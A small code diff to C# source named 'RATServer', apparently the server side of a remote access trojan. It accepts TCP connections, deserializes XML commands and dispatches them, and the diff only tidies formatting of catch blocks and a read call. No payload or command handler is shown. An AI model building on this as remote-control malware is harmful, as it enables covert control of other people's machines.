@@ -34,10 +34,7 @@ namespace RATServer
                 tcpc.Start();
                 sock = new TcpClient();
                 sock = tcpc.AcceptTcpClient();
-            } catch
-            {
-
-            }
+            } catch { }
         }
         static void Check()
         {
@@ -49,12 +46,8 @@ namespace RATServer
                     bool exitAfter = false;
                     NetworkStream nstream = sock.GetStream();
                     byte[] message = new byte[sock.ReceiveBufferSize + 1];
-                    int bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
-                    if (bytesRead == 0)
-                    {
-                        sock.Close();
-                        return;
-                    }
+                    int bytesRead = nstream.Read(message, 0, sock.ReceiveBufferSize);
+                    if (bytesRead == 0) { sock.Close(); return; }
                     Command c = DeserializeFromXml<Command>(Encoding.Unicode.GetString(message, 0, bytesRead));
                     Response r = new Response();
                     switch (c.CMD)
@@ -136,10 +129,7 @@ namespace RATServer
                     nstream.Write(sendBytes, 0, sendBytes.Length);
                     if (exitAfter) { Environment.Exit(0); }
                 }
-                catch
-                {
-                    Check();
-                }
+                catch { Check(); }
             }
         }
         #endregion
